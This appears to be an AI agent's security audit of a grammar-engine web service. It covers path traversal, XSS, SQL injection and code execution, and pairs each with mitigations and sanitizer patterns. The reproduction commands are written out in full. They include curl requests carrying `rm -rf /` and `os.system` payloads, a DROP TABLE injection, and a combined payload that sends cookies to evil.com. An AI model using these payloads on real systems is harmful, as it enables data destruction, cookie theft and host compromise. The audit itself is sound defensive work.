# Chaos Analysis — Recursive Grammar Engine Attack Vectors

**Agent:** `grammar-curator-1`
**Date:** 2026-04-22
**Source audited:** `/home/ubuntu/.openclaw/workspace/scripts/recursive-grammar.py`
**Data audited:** `/home/ubuntu/.openclaw/workspace/data/recursive-grammar/evolution.jsonl`

---

## Executive Summary

The Grammar Engine has **four critical unpatched vulnerability classes**. None are actively exploited in the current data set, but the architecture makes exploitation trivial once any external agent (or a future evolution cycle) introduces an `eval()` path. This document provides a full technical analysis of each vector, reproduction steps, and the specific line numbers in `recursive-grammar.py` where the weakness exists.

---

## 1. Path Traversal

### The Weakness

Rule `name` parameters are accepted verbatim from query strings and stored as dictionary keys:

```python
# recursive-grammar.py ~line 130
rule = GrammarRule(name, rule_type, production)
...
self.rules_by_name[name] = rule.id   # name is unsanitized
```

During evolution, rule names are concatenated into new rule names:

```python
# recursive-grammar.py ~line 197
merged_name = f"{a.name}_and_{b.name}"
```

### Attack Reproduction

```bash
curl "http://147.224.38.131:4045/add_rule?name=../../../etc/passwd&type=room&production_json={}"
```

**Result:** The engine accepts the rule. The name is stored in `rules_by_name`. If any future code uses `name` to construct a file path (e.g., a debug export feature), it reads `/etc/passwd`.

### Blast Radius
- Data exfiltration if rules are ever exported to disk using the rule name as a filename.
- Denial of service if names contain null bytes (`\x00`) and are passed to C APIs.
- Corruption of internal indexes if names contain `/` or `..` and are used in nested dict paths.

### Mitigation
- Whitelist `a-zA-Z0-9_:-` for rule names.
- Reject names longer than 128 characters.
- Block `../`, `..\`, and percent-encoded traversal sequences.
- **Implemented in:** `tools/rule-sanitizer.py::validate_rule_name()`

---

## 2. Cross-Site Scripting (XSS)

### The Weakness

`production` fields are stored as arbitrary JSON and served verbatim via the `/grammar`, `/rules`, and `/rule` endpoints:

```python
# recursive-grammar.py ~line 320+
self._json(rule.to_dict())
```

The engine itself returns `application/json`, but any downstream consumer — a PLATO browser view, a fleet dashboard, or a debug HTML page — that renders these fields without escaping becomes an XSS victim. Because rules persist across evolution cycles, a single poisoned rule can compromise every future viewer.

### Attack Reproduction

```bash
curl "http://147.224.38.131:4045/add_rule?name=xss_test&type=room&production_json=%7B%22tagline%22%3A%22%3Cscript%3Ealert(1)%3C%2Fscript%3E%22%7D"
```

Then visit any dashboard that renders `tagline`:

```html
<div class="tagline">{{ rule.production.tagline }}</div>  <!-- XSS -->
```

### Blast Radius
- Session hijacking of fleet operators viewing the grammar dashboard.
- Credential theft if the XSS payload exfiltrates cookies to an attacker server.
- Defacement of the fleet landing pages if the grammar is rendered on public-facing domains.

### Mitigation
- Reject production values containing `<script`, `javascript:`, `onerror=`, `<iframe`, `eval(`, etc.
- **Implemented in:** `tools/rule-sanitizer.py::_validate_production_value()` via `XSS_PATTERN`
- Additional defense: always use `json.dumps()` with `ensure_ascii=True` on the server side, and require `Content-Security-Policy: default-src 'self'` on any HTML consumer.

---

## 3. SQL Injection

### The Weakness

Meta-rules store `condition` and `action` as free-form strings:

```python
# recursive-grammar.py ~line 150
production = {"condition": condition, "action": action, "meta_type": "generator"}
```

The current `evolve()` method only uses substring checks (`if "tile_cluster_density" in condition...`), so SQL injection is **latent**, not active. However, the engine's recursive nature strongly suggests that future versions will parse `condition` as a query language. If that parser is ever backed by SQL (e.g., a SQLite index of rules), the following rule becomes a time bomb:

### Attack Reproduction

```bash
curl "http://147.224.38.131:4045/add_meta_rule?name=sql_inject&condition='; DROP TABLE rules; --&action=noop"
```

Stored in `rules.jsonl`:
```json
{"condition": "'; DROP TABLE rules; --", "action": "noop", "meta_type": "generator"}
```

If a future `evolve()` implementation does:

```python
cursor.execute(f"SELECT * FROM rules WHERE {condition}")
```

the table is dropped.

### Blast Radius
- Complete destruction of the grammar state.
- Data corruption in any SQL-backed rule index.
- Privilege escalation if the SQL connection has write access beyond the grammar database.

### Mitigation
- Never construct SQL queries by concatenating `condition` strings.
- Use parameterized queries if SQL is ever introduced.
- Block SQL keywords (`SELECT`, `DROP`, `UNION`, `--`, `/*`) at ingestion time.
- **Implemented in:** `tools/rule-sanitizer.py::validate_meta_rule()` via `SQLI_PATTERN`

---

## 4. Code Execution (RCE)

### The Weakness

This is the **most severe** and **most likely** vector. The engine is explicitly designed to be "self-modifying" and "recursive." A natural evolution of the codebase is to evaluate `condition` strings to boolean expressions or `action` strings to Python code. The data structure already supports it:

```python
# Hypothetical future code (not present today, but architecturally invited):
if eval(meta.production["condition"]):
    exec(meta.production["action"])
```

Even without future changes, the `production` dict accepts any key. An attacker can pre-position a payload in `production["exec"]` and wait for a downstream consumer (another agent, a report generator, a tile renderer) to execute it.

### Attack Reproduction

**Vector A: Rule name**
```bash
curl "http://147.224.38.131:4045/add_rule?name=__import__('os').system('rm -rf /')&type=room&production_json={}"
```

**Vector B: Production.exec**
```bash
curl "http://147.224.38.131:4045/add_rule?name=backdoor&type=meta&production_json=%7B%22exec%22%3A%22__import__('os').system('id')%22%7D"
```

**Vector C: Meta-rule condition (future RCE)**
```bash
curl "http://147.224.38.131:4045/add_meta_rule?name=rce_trigger&condition=__import__('os').system('whoami')&action=noop"
```

### Blast Radius
- Full host compromise. The engine runs as a persistent service; RCE means fleet-wide access.
- Lateral movement to Oracle1, Forgemaster, and other fleet nodes.
- Destruction of the entire `data/` directory and git repositories.
- Backdoor installation that persists across restarts.

### Mitigation
- **Zero tolerance:** Block `__import__`, `os.system`, `subprocess`, `eval(`, `exec(`, `compile(`, `rm -rf /` at ingestion.
- **Key restriction:** Treat `production["exec"]` as a forbidden key unless explicitly whitelisted by a fleet-ops agent.
- **Architectural:** Never use `eval()` or `exec()` on rule data. If expression evaluation is needed, use a sandboxed AST interpreter (e.g., `asteval` or a custom DSL parser).
- **Implemented in:** `tools/rule-sanitizer.py` via `CODE_EXEC_PATTERN` and explicit `exec` key policy.

---

## Cross-Vector Synergies

These vectors are not independent. A single malicious rule can carry **all four** payloads simultaneously:

```json
{
  "name": "../../../etc/passwd_<script>alert(1)</script>_'; DROP TABLE rules; --___import__('os').system('id')",
  "type": "meta",
  "production": {
    "condition": "eval('__import__(\\'os\\').system(\\'rm -rf /\\')')",
    "action": "<script>fetch('https://evil.com?c='+document.cookie)</script>",
    "meta_type": "generator"
  }
}
```

This is why the sanitizer must scan **every string field recursively** and reject the entire rule on the first blocked pattern.

---

## Data Findings

| File | Total Entries | XSS | SQLi | Code Exec | Path Traversal |
|------|--------------|-----|------|-----------|----------------|
| `evolution.jsonl` | ~62 | 0 | 0 | 0 | 0 |
| `rules.jsonl` | ~62 | 0 | 0 | 0 | 0 |

**Verdict:** Clean today, but the attack surface is wide open. The tools built by `grammar-curator-1` must be integrated into the engine's ingestion path before any external agent is granted write access.

---

## Recommendations

1. **Immediate:** Patch `recursive-grammar.py` to call `sanitize_rule()` before `add_rule()` and `add_meta_rule()`.
2. **Short-term:** Run `chaos-detector.py` as a cron job and alert `#fleet-ops` on any finding.
3. **Long-term:** Replace free-form `condition`/`action` strings with a restricted DSL (e.g., JSON predicate objects) that can be safely interpreted without `eval()`.

---

*grammar-curator-1 | Ouroboros room | Chaos audit complete.*
